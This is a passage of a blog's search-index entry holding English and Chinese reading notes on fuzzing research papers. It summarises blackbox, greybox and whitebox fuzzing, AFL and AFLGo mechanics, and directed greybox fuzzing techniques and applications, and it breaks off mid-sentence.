<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[IS-pwn-fuzz-theory-present-situation]]></title>
    <url>%2Fposts%2F640b061%2F</url>
    <content type="text"><![CDATA[Survey/Review 本文主要是对相关论文的阅读和摘要。 Fuzzing: Challenges and Reflections 在线pdf. Fuzzing is an automatic bug and vulnerability discovery technique which continuously generates inputs and reports those that crash the program. There are three main categories of fuzzing tools and techniques: blackbox, greybox and whitebox fuzzing. 自动化漏洞发现技术---通过持续不断地生成输入并报告程序crash。 Blackbox fuzzing Blackbox fuzzing generates inputs without any knowledge of the program. There are two main variants of blackbox fuzzing: mutational and generational. In mutational blackbox fuzzing, the fuzz campaign starts with one or more seed inputs. These seeds are modified to generate new inputs. Random mutations are applied to random locations in the input. For instance, a file fuzzer may flip random bits in a seed file. The process continues until a time budget is exhausted. In generational blackbox fuzzing, inputs are generated from scratch. If a structural specification of the input format is provided, new inputs are generated that meet the grammar. Peach (http://community.peachfuzzer.com) is one popular blackbox fuzzer. 两种黑盒模糊测试区别在于前者通过初始语料库开始变异，后者通过提供的输入格式进行生成。 Greybox fuzzing Greybox fuzzing leverages program instrumentation to get lightweight feedback which is used to steer the fuzzer. Typically, a few control locations in the program are instrumented at compile time and an initial seed corpus is provided. Seed inputs are mutated to generate new inputs. Generated inputs that cover new control locations, and thus increase code coverage, are added to the seed corpus. The coverage feedback allows a greybox fuzzer to gradually reach deeper into the code. In order to identify bugs and vulnerabilities, sanitizers inject assertions into the program. Existing greybox fuzzing tools include AFL (https://lcamtuf.coredump.cx/afl/), LibFuzzer (https://llvm.org/docs/LibFuzzer.html), and Honggfuzz (https://github.com/google/honggfuzz). 灰盒模糊测试通过在编译时对一些位置（例如代码块跳转点）进行插桩来获取运行时反馈，从而更好的筛选语料进入语料库，获取更好的覆盖率，深入代码发现漏洞。 Whitebox fuzzing Whitebox fuzzing is based on a technique called symbolic execution, which uses program analysis and constraint solvers to systematically enumerate interesting program paths. The constraint solvers used as the back-end in whitebox fuzzing are Satisfiability Modulo Theory (SMT) solvers, which allow for reasoning about (quantifier free) first-order logic formulas with equality and function/predicate symbols drawn from different background theories. Whitebox fuzzers calculate the path condition of an input i—the set of inputs which traverse the same path as i. The path condition is represented as an SMTformula, e.g. i[0] = 42 ∧ i[0] − i[1] &gt; 7. Given a seed input s, the path condition is calculated and mutated (as opposed to mutating the program input). The mutated path condition is then sent to a constraint solver to generate new inputs. The main benefit of this technique is that by carefully keeping track of path conditions of all inputs seen so far, it always generates an input traversing a new path (new control flow). Existing whitebox fuzzing tools include KLEE (https://klee. github.io/) and SAGE. 基于符号执行的白盒模糊测试，通过变异路径条件，然后利用约束求解器生成新的输入，这种方式总是能生成一个经过新的路径（深入代码）的输入。 Other fuzzing tools DeepState, a unit testing framework that allows developers to fuzz the various units of their system (https://github. com/trailofbits/deepstate). The Mayhem system. --- Sang Kil Cha, Thanassis Avgerinos, Alexandre Rebert, David Brumley. 2012. Unleashing Mayhem on Binary Code. IEEE Symposium on Security and Privacy (S&amp;P’12). Challenges 现阶段模糊测试的挑战。 Automation 自动化模糊测试方面的挑战。 [C.1] More Software. How can we fuzz efficiently more types of software systems? How to fuzz programs that take highly-structured inputs, such as file parsers or object-oriented programs. Fuzzing cyber-physical systems, which interact with the environment as part of their execution, or machine learning systems, whose behavior is determined by their training data, is an under-explored area. How do we fuzz stateful software, such as protocol implementations, which can produce different outputs for the same input? How do we fuzz polyglot software which is written in several languages? How do we fuzz GUI-based programs that take as inputs a sequence of events executed on a user interface? Given a program whose input domain is defined by a grammar and/or protocol, how can a symbolic execution tool effectively formulate constraints on such ,,structured” input domains? 如何扩展能够进行模糊测试的领域和范围。 [C.2] More Bug Types. How can the fuzzer identify more types of vulnerabilities? Vulnerabilities are often encoded as assertions on the program state. Using such assertions, we already know how we can discover memory- or concurrency related errors. The discovery of side-channel vulnerabilities, such as information leaks or timing, cache, or energy-related side-channels is currently an active research topic. Going forward, we should invent techniques to automatically detect and invoke privilege escalation, remote code execution, and other types of critical security flaws, not only in C/C++ but also in other programming languages. 如何扩展模糊测试发现的漏洞类型？现在已经可以利用断言检测程序运行状态发现内存和并发漏洞。侧信道漏洞发现已经成为热门，未来应该着眼于其他的关键性安全漏洞，包括其他编程语言中的。 [C.3] More Difficult Bugs. How can we find “deep bugs” for which efficient oracles exist, but which nevertheless evade detection? Are there certain kinds of deep bugs that can be found efficiently with specialized approaches? Structure-aware and grammar-based fuzzing as well as the integration of static analysis and symbolic execution with greybox fuzzing are promising directions. Software also changes all the time—techniques that can target software patches will prove essential for finding bugs as they are introduced. We should investigate strategies to boost fault finding, such as AFLFast which enables faster crash detection in greybox fuzzers, and study the utility of GPUs and other means of efficient parallelization to maximize the number of executions per unit time. Ranking bugs in terms of their importance can also improve the effectiveness of fuzzing in practice. 如何发现更深层次的漏洞？ 结构感知和基于语法的模糊测试，以及静态分析和符号执行与灰盒模糊测试的结合是很有前途的方向。 针对软件补丁的技术可能是发现错误的关键。 应该研究促进故障发现的策略。 [C.4] More Empirical Studies. What is the nature of vulnerabilities that have evaded discovery despite long fuzzing campaigns? Why have they evaded discovery? We need empirical studies to understand the nature and distribution of security vulnerabilities in source code. 需要实证研究来了解源代码中安全漏洞的性质和分布。 The Human Component 模糊测试中的人工成分。 [C.5] Human-In-The-Loop. How can fuzzers leverage the ingenuity of the auditor? During our meeting, Ned Williamson, a prolific security researcher at Google, demonstrated his semi-automated approach to vulnerability discovery. Ned would first audit the code to identify units that may contain a security flaw. He would prepare the unit for fuzzing, run the fuzzer for a while, and identify roadblocks for the fuzzer. Ned would manually patch out the roadblock to help the fuzzer make better progress. If the fuzzer spends more time fuzzing less relevant portions of the code, Ned would adjust the test driver and re-focus the fuzzer. Once a potential vulnerability is found, he would backtrack, add each roadblock back, and adjust the vulnerability-exposing input accordingly. This semi-automated process raises several research questions. How can we facilitate a more effective communication between fuzzer and security auditor? How can the security auditor dynamically direct the fuzzer? How can the fuzzer explain what prevents it from progressing, and how can the auditor instruct the fuzzer to overcome the roadblock? 人在模糊测试中能起到的作用，也就是什么才是最合理的半自动化模糊测试方案？ [C.6] Usability. How can we improve the usability of fuzzing tools? 如何提高模糊工具的可用性？ Fuzzing Theory Why do some fuzzers work so much better than others? What are their limitations? We want to be able to explain interesting phenomena that we have observed empirically, make predictions and extrapolate from these observations. To do this, we need a sound theoretical model of the fuzzing process. [C.7] How can we assess residual security risk if the fuzzing campaign was unsuccessful? Blackbox and whitebox fuzzing sit on two ends of a spectrum. A whitebox fuzzer might provide a formal guarantee about the absence of detectable vulnerabilities. If we assume that a symbolic execution engine can enumerate all paths in piece of code and the oracle is encoded as assertions, then whitebox fuzzing can formally verify the absence of bugs. If it can enumerate only some paths in reasonable time, we can still provide partial guarantees. To make symbolic execution applicable in practice, correctness or completeness are traded for scalability. How does this trade-off affect the guarantees? In contrast, a blackbox fuzzer can never guarantee the absence of vulnerabilities for all inputs. What is the residual risk that at the end of a fuzzing campaign a bug still exists in the program that has not been found? If we model blackbox fuzzing as a random sampling from the program’s input space, we can leverage methods from applied statistics to estimate the residual risk. A greybox fuzzer uses program feedback to boost the efficiency of finding errors. However, this program feedback introduces an adaptive bias. How do we account for this adaptive bias when assessing residual risk? To answer such questions, we should develop statistical and probabilistic frameworks, and methodologies for sound estimation with quantifiable accuracy. 除了白盒模糊测试，灰盒模糊测试和黑盒模糊测试都不能保证没有未发现的漏洞。白盒模糊测试受限于时间和可扩展性也无法完全保证，灰盒模糊测试存在适应性偏差，黑盒模糊测试存在剩余风险。 [C.8] What are the theoretical limitations of blackbox, greybox, and whitebox fuzzing? Given a program and a time budget, how can we select that fuzzing technique, or combination of techniques, which finds the most vulnerabilities within the time budget? How do program size and complexity affect the scalability and performance of each technique? How much more efficient is an attacker that has an order of magnitude more computational resources? Evaluation and Benchmarks [C.9] How can we evaluate specialized fuzzers? [C.10] How can we prevent overfitting to a specific benchmark? [C.11] Are synthetic bugs representative? [C.12] Are real bugs, which have previously been discovered with other fuzzers, representative? [C.13] Is coverage a good measure of fuzzer effectiveness? [C.14] What is a fair choice of time budget? [C.15] How do we evaluate techniques instead of implementations? Survey The survey participants marked improving automation (71%), building a theory of fuzzing (63%), and finding valid measures of fuzzer performance (63%) as their Top-3 most important challenges. While practitioners and researchers were mostly in agreement, practitioners demonstrated a particularly greater interest in the development of human-in-the-loop approaches (+0.8 Likert points). On average, a respondent marked all identified challenges as important or very important on a 5-point Likert-scale. SoK: The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing 在线pdf. Abstract—Greybox fuzzing has been the most scalable and practical approach to software testing. Most greybox fuzzing tools are coverage guided as code coverage is strongly correlated with bug coverage. However, since most covered codes may not contain bugs, blindly extending code coverage is less efficient, especially for corner cases. Unlike coverage-based fuzzers who extend the code coverage in an undirected manner, a directed fuzzer spends most of its time budget on reaching specific target locations (e.g., the bug-prone zone) without wasting resources stressing unrelated parts. Thus, directed greybox fuzzing is particularly suitable for scenarios such as patch testing, bug reproduction, and special bug hunting. 与盲目扩展路径覆盖范围的基于覆盖范围的模糊测试程序不同，定向模糊测试程序将其大部分时间预算花在到达特定的目标位置（例如，容易出bug的区域）上，而不会浪费资源来测试不相关的部分。因此，定向灰盒模糊测试特别适用于补丁测试、bug复现以及与其他工具集成等场景。 传统的导向模糊测试是基于符号执行，但是这种方法会受到符号执行一些问题而限制（复杂的约束求解和路径爆炸等问题）。 Introduction Traditionally, directed fuzzers are based on symbolic execution, which uses program analysis and constraint solving to generate inputs that exercise different program paths. Such directed fuzzers cast the reachability problem as iterative constraint satisfaction problem. However, since directed symbolic execution relies on heavyweight program analysis and constraint solving, it suffers from scalability and compatibility limitations. By specifying a set of target sites in the program under test (PUT) and leveraging lightweight compile-time instrumentation of the PUT, a directed greybox fuzzer calculates the distance between the seed and the target to assist seed selection. By giving more mutation chances to the seeds that are closer to the target, it can steer the greybox fuzzing to reach the target locations. DGF casts reachability as an optimization problem to minimize the distance of the generated seeds to the targets. Compared with directed symbolic execution, DGF has much better scalability and improves the efficiency by several magnitudes. For now, DGF has evolved beyond the primary pattern that depends on manually labeled target sites and distance-based metrics to prioritize the seeds. A great number of variations have been realized to boost software testing under different scenarios, such as fuzzers directed by target sequence, by semantic information, by parser, by typestate, by sanitizer checks, by memory usage, and by vulnerable probability. Complex deep behavioral testing scenes, such as use-afterfree bugs, memory consumption bugs, memory violation bugs, algorithmic complexity vulnerabilities, input validation bugs in robotic vehicles, and deep stateful bugs. 定向灰盒模糊测试技术将目标位置的可达性问题转化为一个优化问题，以最小化生成的输入种子到目标位置的距离为标准来进行语料库的筛选。目前，定向灰盒模糊测试技术已经超越了依赖于手动标记的目标位置和基于距离的度量来确定输入种子优先级的主要模式。为了在不同的场景下提高软件测试，已经实现了大量的变体。 Background This section provides the background knowledge on CGF and DGF. Terminology To avoid the confusion on the presentation of different literature, we unify the terminology in fuzzing. Fuzzing. In this paper, fuzzing refers to traditional blackbox fuzzing and greybox fuzzing. We exclude whitebox fuzzing as it depends on constraint solving of symbolic execution to generate inputs, which is quite different from evolutionary fuzzers based on mutation. Testcase. A testcase is an input to the PUT, which is generated by randomly mutating a seed. Seed. A seed is a testcase that is favored (trigger a new path or close to the target) and retained for the mutation to generate new testcases in the next fuzzing iteration. Seed prioritization. Seed prioritization means to evaluate and sort the seeds according to its performance. Prioritized seeds would be given more fuzzing chances. Power schedule Power schedule means to determine the number of fuzzing tests to be applied on a seed (i.e., energy). Fuzzing cycle All seeds in the seed queue have been fuzzed at least once. 本论文对模糊测试中术语的定义。 Coverage-guide Greybox Fuzzing Coverage-guide greybox fuzzing is the most prevalent fuzzing scheme that aims to maximize the code coverage to find hidden bugs. AFL (American fuzzy lop) is the stateof-the-art coverage-based greybox fuzzer, and many stateof-the-art greybox fuzzers are built on top of it. Here we use AFL as a representative to illustrate the principle of CGF. AFL uses lightweight instrumentation to capture basic block transitions and gain coverage information during runtime. Then it selects a seed from the seed queue and mutates the seed to generate testcases. If a testcase exercises a new path, it is added to the queue as a new seed. AFL favors seeds that triggered new paths and give them preference over the non-favored ones. Compared to other instrumented fuzzers, AFL has a modest performance overhead. Edge coverage. AFL obtains the execution trace and calculates the edge coverage by instrumenting the PUT at compile time. It inserts random numbers for each branch jump at compile-time and collects these inserted numbers from the register at run-time to identify the basic block transition. Edge coverage is more delicate and sensitive than basic block coverage as it takes into account the transition between basic blocks. It is also more scalable than path coverage as it avoids path explosion. Seed prioritization. AFL leverages the edge-coverage information to select seeds. It maintains a seed queue and fuzzes the seed within it one by one. It labels some seeds as “favored” when they execute fast and are small in size. AFL uses a bitmap with edges as keys and top-rate seeds as values to maintain the best performance seeds for each edge. It selects favored seeds from the top_rated queue, and gives these seeds preference over the non-favored ones by giving the favored one more fuzzing chances. Mutation strategies. AFL has two categories of mutation strategies: deterministic strategies and non-deterministic strategies. The deterministic strategies are applied first, which leverage mutators based on bit-flip, arithmetic, token, dictionary, and interest values to sequentially mutate the seeds with different granularity. After doing deterministic strategies, AFL introduces non-deterministic strategies, including the havoc stage and splice stage. In the havoc stage, AFL mutates the seed by randomly choosing a sequence of mutation operators from the deterministic strategies and apply them to random locations in the seed file. As a result, the generated testcase is significantly different from the original seed. Then, AFL uses the splice strategy to randomly choose another seed from the seed queue and recombine it with the current seed to generate a new seed. Then, the havoc strategies are re-implemented to the new seed. Power schedule. In the deterministic stage, mutation strategies are involved sequentially, but in the non-deterministic stage, AFL can assign energy to the seed to decide the fuzzing chances of each seed. The energy is assigned according to the performance score of each seed, which is based on coverage (prioritize inputs that cover more paths), execution time (prioritize inputs that execute faster), and discovery time (prioritize inputs discovered later) Particularly, if the test case exercises a new path, AFL will double the assigned energy. 以AFL为例介绍了覆盖率导向灰盒模糊测试技术。 AFL使用上下文不敏感的边缘覆盖替代一般的基本块覆盖。边缘覆盖比基本块覆盖更精细和敏感，因为它考虑了基本块之间的过渡，边缘覆盖比路径覆盖更具可伸缩性，因为它避免了路径爆炸。AFL在编译时为每个分支跳转插入随机数，并在运行时从寄存器收集这些随机数获知跳转信息，统计边缘覆盖。 AFL偏爱触发新路径的输入种子，AFL通过一个位图记录每个种子的优先级，对于优先级高的种子，AFL给予更多的模糊机会，也就是后面说的能量。 AFL有两类变异策略：确定性策略和非确定性策略。AFL首先采用确定性策略，利用基于位翻转、算术、令牌、字典和兴趣值的变异器依次变异不同粒度的种子。在进行确定性策略之后，AFL就会进行非确定性策略，包括havoc阶段和拼接阶段。在havoc阶段，AFL通过从确定性策略中随机选择一系列变异算子对种子进行变异，并将其应用于种子文件中的随机位置。因此，生成的testcase与原始种子有很大的不同。然后，AFL使用剪接策略从种子队列中随机选择另一个种子，并将其与当前种子重新组合以生成新的种子。最后，对新种子重新实施破坏策略。 AFL通过能量调度来分配一轮模糊测试的时间。在确定性阶段，变异策略依次参与，而在非确定性阶段，AFL可以给种子分配能量来决定每个种子的模糊机会。能量是根据每个种子的性能得分来分配的，这是基于覆盖率（优先考虑覆盖更多路径的输入）、执行情况时间（对执行速度更快的输入进行优先级排序）和发现时间（对稍后发现的输入进行优先级排序）。特别的，如果测试用例执行一条新路径，AFL将加倍分配的能量。 Directed Greybox Fuzzing In 2017, B¨ohme et al. introduced the concept of Directed Greybox Fuzzing (DGF) and implemented a tool called AFLGo based on the modern greybox fuzzing framework. Unlike blindly increasing the path coverage in coverage-based greybox fuzzing, DGF aims to reach a set of pre-identified locations in the code (potentially the buggy parts) and spends most of its time budget on reaching target locations without wasting resources stressing unrelated parts. Here we use AFLGo as the representative to illustrate how DGF works. AFLGo follows the general principles and architecture as coverage-guided fuzzing. During the compiletime, in addition to instrument to obtain the execution path and path coverage information, AFLGo also calculate the distances between the input and the pre-defined targets. The distance is calculated based on the average of basic blocks on the input seed’s execution trace weight to the target basic blocks, where the weight is determined by the number of edges in the call graph and control-flow graphs of the program. Then, at runtime, AFLGo prioritize seeds based on distance instead of new path coverage and give preference to seeds closer to the targets at basic block level distance. B¨ohme et al. view the greybox fuzzing process as a Markov chain that can be efficiently navigated using a “power schedule”. They leverage a simulated annealing strategy to gradually assign more energy to a seed that is closer to the targets than to a seed that is further away. They cast reachability as an optimization problem to minimize the distance of the generated seeds to the targets. The exploration-exploitation problem. For DGF, the whole fuzzing process is divided as the exploration phase and the exploitation phase. The exploration phase is designed to uncover as many paths as possible. Like many coverageguided fuzzers, DGF in this phase favors the seeds that trigger new paths and prioritizes them. This is because new paths increase the potential to lead to the targets. It is particularly necessary when the initial seeds are quite far from the targets. Then, based on the known paths, the exploitation phase is invoked to drive the engine to the target code areas. In this phase, B¨ohme et al. prioritize seeds that are closer to the targets and assign more energy to them. The intuition is that if the path that the current seed executes is closer to any of the expected paths that can reach the target, more mutations on that seed should be more likely to generate expected seeds that fulfill the target. The exploration-exploitation tradeoff lies in how to coordinates these two phases. B¨ohme et al use a fixed splitting of the exploration and exploitation phases. For example, for 24-hour testing, AFLGo uses 20 hours for the exploration and then 4 hours for the exploitation. 以AFLGo为例介绍了定向灰盒模糊测试技术。 与AFL不同，除了获取执行路径和路径覆盖信息外，AFLGo还计算输入与预定义目标之间的距离。该距离基于输入种子的执行跟踪权值上的基本块到目标基本块的平均值来计算，其中权值由程序的调用图和控制流图中的边数来确定。 Bo¨hme等人将灰盒模糊化过程视为一个马尔可夫链，可以使用“功率调度”进行有效导航。他们利用模拟退火策略，逐渐将更多的能量分配给距离目标较近的种子，而不是距离目标较远的种子。他们将可达性问题转化为一个优化问题，以最小化生成的种子到目标的距离。 AFLGo将整个DGF分为两个阶段，探索阶段和开发阶段。 勘探阶段的目的是尽可能多地揭示路径，像许多覆盖率导向模糊程序一样，这个阶段的DGF偏爱触发新路径并对其进行优先级排序的种子，因为新的路径增加了通向目标的可能性。当最初的种子离目标相当远时，这是合理的。 开发阶段的目的是最小化生成的种子到目标的距离。在这一阶段，Bo¨hme等人对更接近目标的种子进行优先排序，并为它们分配更多的能量。直觉是，如果当前种子执行的路径更接近可以到达目标的任何预期路径，那么该种子上的更多突变应该更有可能生成实现目标的预期种子。 勘探开发的权衡在于如何协调这两个阶段。Bo¨hme等人使用固定的勘探和开发阶段划分。例如，对于24小时测试，AFLGo使用20小时进行勘探，然后使用4小时进行开发。 Difference between CGF and DGF Seed prioritization. A major difference between CGF and DGF lies in the seed prioritization. Since CGF aims to maximize the path coverage, CGF gives preference to seeds that trigger new paths. Differently, DGF aims to reach specific locations in the code. Thus, it prioritizes seeds that are “closer” to the targets. The evaluation metrics of the seeds varies a lot, including distance, coverage, path, and probability. Target involvement. CGF expands code coverage in an undirected manner, which wastes testing resources on code regions do not contain bugs. While for DGF, a set of targets are marked in advance, manually or automatically, to guide the fuzzing process and save the power. The target selection can affect the performance of DGF. For example, selecting critical sites, such as memory allocation function malloc() or string manipulation function strcpy(), as targets are more likely to trigger memory corruption bugs. Besides, we can leverage the relationship among targets to accelerate detecting complex behavioral bugs, such as use-after-free. Thus, the involvement of targets gives more chance to optimize DGF by applying customized techniques that are specific to DGF. Exploration-exploitation. Researchers model the greybox fuzzing process as a “multi-armed bandit problem” where the seeds are considered as arms of a multiarmed bandit. For coverage-based greybox fuzzing, the whole process is essentially a tradeoff of the exploration-exploitation problem, where exploration stands for trying as many seeds as possible while exploitation means mutating a certain seed as much as possible. For DGF, the exploration-exploitation problem lies in coordinating the exploration phase and the exploitation phase. In the exploration phase, DGF try to discover as many seeds as possible and learn information from them to increase the potential to reach the targets. At the same time, the exploitation phase gives more chances of mutation to seeds that are more likely to generate inputs to reach the target. CGF和DGF技术的不同点。 种子优先级。CGF的目标是最大化路径覆盖，所以会偏爱触发新路径的种子。而DGF的目标是到达代码中的特定位置，所以它偏爱更接近目标的种子。也就是两者对于种子优先级的评价指标不同，包括距离、覆盖率、路径和概率。 探索目标。CGF以一种无方向的方式扩展代码覆盖范围，在不包含bug的代码区域浪费能量。DGF则预先对一组目标位置进行人工或自动标记，以指导整个模糊测试过程，从而节省能量。目标的选择会影响DGF的性能。例如，选择关键目标（如内存分配函数malloc或字符串操作函数strcpy）作为目标更可能触发内存溢出漏洞。此外，我们还可以利用目标之间的关系来加速检测复杂的逻辑漏洞，例如UAF。 勘探开发。对于基于覆盖率的灰盒模糊测试，整个过程本质上是一个探索-开发问题的折衷，其中探索意味着尝试尽可能多的种子，而开发意味着尽可能多地变异某个种子。对于DGF来说，勘探开发问题在于勘探阶段与开发阶段的协调。在探索阶段，DGF试图发现尽可能多的种子，并从中获取更多的新路径，以增加到达目标的可能性。同时，开发阶段给了一些种子更多的变异机会，这些种子更有可能产生到达目标的输入。 Application of DGF DGF is a promising direction as it is especially suitable and effective for specific testing scenarios. We summarize the following common practical application of DGF. Patch testing. DGF can be used to test whether a patch is complete and compatible. A patch is incomplete when a bug can be triggered by multiple inputs, for example, CVE-2017-15939 is caused by an incomplete fix for CVE-2017-15023. Meanwhile, a patch can introduce new bugs. For example, CVE-2016-5728 is introduced by a careless code update. Thus, directed fuzzing towards problematic changes or patches has a higher chance of exposing bugs. Bug reproduction. DGF is useful when reproducing a known bug without the buggy input. For example, due to concerns such as privacy, some applications (e.g., video player) are not allowed to send the input file. With DGF, the in-house development team can use DGF to reproduce the crash with the method calls in stack-trace and some environmental parameters. DGF is also helpful when generating Proof-of-Concept (PoC) inputs of disclosed vulnerabilities given bug report information. In fact, DGF is in demand because 45.1% of the usual bug reports cannot be reproduced due to missing information and users privacy violations. Knowledge boost. DGF can boost program testing by integrating the knowledge from a human analyst or auxiliary techniques. Human-in-the loop is commonly used in software testing, which can help to identify the critical syscalls or security-sensitive program sites (e.g., memory allocation function malloc(), string manipulation function strcpy()) based on the previous experience to guide fuzzing to error-prone parts. Auxiliary techniques, such as symbolic execution and tait analysis can be leveraged to overcome roadblocks in the testing. Preliminary results from static analysis and machine learning based detection approach can be used as the potential vulnerable targets for DGF. Energy saving. Another interesting application of DGF is when the testing resource is limited, for example, fuzzing the IoT devices. Under this circumstance, to save the time and computational resources spent on non-buggy like code regions, identifying critical code areas to guide the testing is more efficient than testing the whole program in an undirected manner. Special bug hunting. Finally, DGF can be applied to hunting special bugs based on customized indicators. For example, finding uncontrolled memory consumption bugs under the guidance of memory usage, find useafter-free bugs under the guidance of typestate violation. With DGF, the efficiency of discovering behavioral complex bugs can be greatly improved. DGF常见的应用。 补丁测试。DGF可以用来测试补丁是否完整和兼容。修补程序在以下情况下是不完整的：一个错误可以由多个输入触发；一个补丁可能会引入新的bug。因此，针对有问题的更改或补丁的定向模糊有更高的暴露bug的机会。 bug复现。对于复现没有触发bug的输入的已知bug，DGF是非常擅长的。例如，出于隐私等考虑，某些应用程序（如视频播放器）不允许发送输入文件。使用DGF，内部开发团队可以使用DGF通过stack-trace中的方法调用和一些环境参数来再现崩溃。在给定错误报告信息的情况下，DGF也可以生成已披露漏洞的概念验证（PoC）输入。事实上，DGF的需求量很大，因为45.1%的常见错误报告由于信息丢失和用户隐私侵犯而无法复现。 人机合一（意译法）。DGF可以集合来自分析人员的知识或辅助技术来促进程序测试。通过分析人员的知识和经验可以帮助DFG识别关键的系统调用或security-sensitive的程序站点（例如，内存分配函数malloc、字符串操作函数strcpy），基于以前的经验来引导模糊化到容易出错的部分。如符号执行和tait analysis之类的辅助技术可以用来解决测试中的障碍，而静态分析和基于机器学习的检测方法的初步结果可以用作DGF的潜在易受攻击目标。 资源的有效利用。当测试资源有限时，例如，对物联网设备进行模糊测试。为了节省花费在非bug类代码区域上的时间和计算资源，识别关键代码区域来指导测试比无方向地测试整个程序更有效。 特定bug狩猎。DGF可以应用于基于定制指标的特定bug搜索。例如，在内存使用状况的指导下查找内存泄漏bug，在typestate violation（应该是指违反了特定的使用范例，例如free后并未清除指针）的指导下查找UAF漏洞。使用DGF，可以大大提高发现行为复杂bug的效率。 Assessment of the-state-of-the-art Works To conduct a thorough assessment, we extract 15 metrics based on the features of DGF. We further divide the metrics into three categories, including basic information, implementation details, and optimization methods. In the following, we concentrate on properties that related to the critical techniques of DGF, including directed type, input optimization, seed prioritization, power assignment, mutation scheduling, and data-flow analysis. Detailed assessment is listed in Table I. 为了进行全面的评估，论文根据DGF的特征提取了15个度量。同时进一步将度量分为三类，包括基本信息、实现细节和优化方法。在下文中，论文集中讨论与DGF关键技术相关的特性，包括定向类型、输入优化、种子优先级、能量分配、变异调度和数据流分析。上图（表1）为具体评价。 Directed Type Although this paper focuses on directed greybox fuzzing (noted as G in Table I), some of the works we investigated adopt symbolic execution to enhance the directedness, forming directed hybrid fuzzing (noted as H), we also include them in this table. For the directed type, DGF was initially directed by target sites that are manually labeled in the PUT, such as AFLGo and Hawkeye. Then, researchers noticed that the relationship among the targets is also helpful. For example, in order to trigger use-after-free vulnerabilities, a sequence of operations (e.g., allocate memory, use memory, and free memory) must be executed in a specific order. UAFuzz and UAFL leverages target sequences instead of target sites to find use-after-free vulnerabilities. LOLLY also uses target statement sequences to guide greybox fuzzing to trigger bugs that resulted from the sequential execution of multiple statements. Berry uses symbolic execution to enhance the directedness of LOLLY when reaching deep targets along complex paths. Apart from the target sequence, researchers have proposed various mechanisms to direct the fuzzing process. Memlock is directed by memory usage to find uncontrolled memory consumption bugs. V-Fuzz is directed by vulnerable probability, which is predicted by a deep learning model to guide the fuzzing process to potentially vulnerable code area. SemFuzz and DrillerGo leverage semantic information retrieved from CVE description and git logs to direct fuzzing and generate PoC exploits. 1DVUL is directed by patch-related branches that directly change the original data flow or control flow to discover 1-day vulnerabilities. SAVIOR and ParmeSan are directed by information from sanitizers. IJON leverages annotations from a human analyst to guide the fuzzer to overcome significant roadblocks. RVFUZZER is directed by control instability to find input validation bugs in robotic vehicles. PFUZZER is directed explicitly at input parser to cover the space of possible inputs well. DGF has evolved from reaching target locations to hunting complex deep behavioral bugs. 该论文主要研究有向灰盒模糊测试（表1中记为G），不过在某些工作中采用了符号执行来增强有向性，形成了有向混合模糊测试（表1中记为H）。 对于定向类型，DGF最初由PUT中手动标记的目标位置定向，如AFLGo和Hawkeye。 研究人员后来发现目标之间的关系也是有帮助的，也就是改变单独的目标为目标序列。例如，为了出发UAF漏洞，必须按特定顺序执行一系列操作：分配内存、使用内存和释放内存。UAFuzz和UAFL利用目标序列而不是目标位置发现UAF漏洞。LOLLY还使用目标语句序列来引导灰盒模糊测试触发由多个语句的顺序执行导致的bug。Berry使用符号执行来增强LOLLY沿着复杂路径到达深层目标时的方向性。 除了目标序列之外，研究人员还提出了各种机制来指导模糊测试程序。Memlock通过内存使用来查找内存泄漏漏洞。V-Fuzz以易受攻击概率为指导，通过深度学习模型预测易受攻击概率，将模糊测试程序引导到潜在易受攻击的代码区域。SemFuzz和DrillerGo利用从CVE描述和git日志中检索到的语义信息来指导模糊测试并生成PoC报告。1DVUL通过那些直接改变原始数据流或控制流的补丁指导以发现1-day漏洞。SAVIOR和Parmasan是由来自sanitizers（Sanitizers是谷歌发起的开源工具集）的信息指导的。IJON利用来自分析人员的注释来指导模糊测试程序克服重要的障碍。RVFUZZER受control instability的指导，在机器人车辆中发现输入验证漏洞。PFUZZER明确地指向输入解析器，从而更好地覆盖代码区域。 DGF已经从到达目标位置发展到猎取复杂的深层的行为漏洞。 Input Optimization Once the targets are marked, DGF needs to generate a seed input to invoke the fuzzing process. A good seed input can drive the fuzzing process closer to the target location and improve the performance of the later mutation process. According to Zong et al., on average, over 91.7% of the inputs of AFLGo cannot reach the buggy code. Thus, optimizing the input generation has much room to improve the directedness of DGF. SeededFuzz focuses on improving the generation and selection of initial seeds to achieve the goal of directed fuzzing. It utilizes dynamic taint analysis to identify the bytes of seeds which can influence values at security-sensitive program sites and generates new inputs by mutating the relative bytes and feeds them to target programs to trigger errors. FuzzGuard uses a deep-learning-based approach to filter out unreachable inputs before exercising them. It views program inputs as a kind of pattern and uses a large number of inputs labeled with the reachability to the target code learned from previous executions to train a model. Then, FuzzGuard utilizes the model to predict the reachability of the newly generated inputs without running them, which saves the time spent on real execution. A fuzzer can perform much better if it generates the input concerning the input grammar. TOFU takes advantage of the known structure of the programs inputs in the form of a protobuf specification to generate valid inputs. TOFU augments the input space to include command-line flags by dividing the fuzzing process into syntactic-fuzzing and semantic-fuzzing. However, it usually takes one or two days to implement input-language grammar even if the user is familiar with the input language. SemFuzz leverages information (syscalls and parameters) retrieved from CVE description and git log to build designed seed inputs to increases the probability of hitting the vulnerable functions. TIFF and ProFuzzer identify input types to assist mutation towards maximizing the likelihood of triggering memory corruption bugs. PFUZZER is a syntax-driven approach that specifically targets input parsers to maximize the input space coverage without generating plausible inputs. 优化输入生成对提高DGF的方向性有很大的提升空间。 seedfuzz致力于改进初始种子的生成和选择，以达到定向模糊的目的。它利用动态污点分析来识别种子当中那些会影响security-sensitive程序位置的值的字节，通过改变这些字节来生成新的输入提供给目标程序以触发错误。 FuzzGuard使用了一种基于深度学习的方法，在练习之前过滤掉无法达到的输入。它将程序的输入看作一种模式，并使用大量的在之前的执行中能够到达目标代码的输入来训练模型。然后，FuzzGuard利用该模型预测新生成的输入的可达性，而无需运行它们，从而节省了实际执行所需的时间。 TOFU利用protobuf规范形式的程序输入的已知结构来生成有效的输入。TOFU将模糊测试过程分为语法模糊化和语义模糊化以包含命令行标志，扩展了输入空间。然而，即使用户熟悉输入语言，实现输入语言语法通常也需要一到两天的时间。 SemFuzz利用从CVE描述和git日志中检索到的信息（系统调用和参数）来构建设计好的种子输入，以增加命中易受攻击函数的概率。 TIFF和ProFuzzer识别输入类型，以帮助变异最大化触发内存溢出漏洞的可能性。 PFUZZER是一种语法驱动的方法，专门针对输入解析器，在生成不合理输入的情况下最大化输入空间覆盖率。 Seed Prioritization The crux of DGF is selecting and prioritizing the seeds that perform better in directedness under certain metrics. We summarize three prevalent metrics widely adopted by modern works, including distance, 